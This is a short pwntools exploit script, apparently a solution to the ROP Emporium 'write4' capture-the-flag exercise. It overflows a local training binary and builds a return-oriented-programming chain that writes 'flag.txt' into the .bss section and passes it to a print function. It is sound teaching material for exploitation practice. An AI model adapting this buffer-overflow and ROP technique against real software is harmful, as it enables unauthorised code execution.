from pwn import *

context.terminal = ('kgx', '-e')
context.binary = elf = ELF('./write4')
libc = ELF('./libwrite4.so')

if args.DEBUG:
    r = gdb.debug(elf.path, '''
        b pwnme
        c            
    ''')
else:
    r = process(elf.path)

payload = b'a'*40 + flat([
    0x400693,       # pop rdi; ret;
    p64(int(b'txt.'.hex(), 16)),
    0x400691,       # pop rsi; pop r15; ret;
    p64(elf.bss()+4), # rsi (address to write)
    p64(0xcaca),    # r15 (dummy value) 
    0x400629,       # mov dword ptr [rsi], edi; ret; scrive nell'indirizzo puntato da rsi il valore di edi (rdi)

    0x400693,       # pop rdi; ret;
    p64(int(b'galf'.hex(), 16)),
    0x400691,       # pop rsi; pop r15; ret;
    p64(elf.bss()), # rsi (address to write)
    p64(0xcaca),    # r15 (dummy value) 
    0x400629,       # mov dword ptr [rsi], edi; ret; scrive nell'indirizzo puntato da rsi il valore di edi (rdi)

    0x400693,       # pop rdi; ret;
    p64(elf.bss()), # rdi (address of 'flag.txt')
    0x400620,       # objective (to call with 'flag.txt' pointer as argument (rdi))
])

r.sendafter(b'> ', payload)
print(r.recvall().strip().decode())
